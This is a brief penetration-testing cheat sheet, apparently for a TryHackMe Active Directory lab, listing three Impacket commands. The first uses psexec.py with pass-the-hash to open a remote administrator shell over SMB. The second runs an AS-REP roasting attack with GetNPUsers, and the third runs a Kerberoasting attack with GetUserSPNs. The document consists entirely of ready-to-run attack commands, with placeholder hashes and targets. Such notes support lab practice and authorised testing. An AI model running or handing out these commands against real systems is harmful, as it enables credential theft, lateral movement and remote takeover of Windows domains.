# psexec get remote shell over SMB with administrator account
```bash
psexec.py administrator@$IP -hashes abcd123abcd123abcd123abcd123abcd:abcd123abcd123abcd123abcd123abcd
```

# impacket ASREP roast with Get-NPUsers
note that the domain must end in a /
```bash
impacket-GetNPUsers -request -usersfile users -dc-ip $IP LAB.ENTERPRISE.THM/
```

# kerberoast with impacket-GetUserSPNs
```bash
impacket-GetUserSPNs -dc-ip $IP -request LAB.ENTERPRISE.THM/username
```
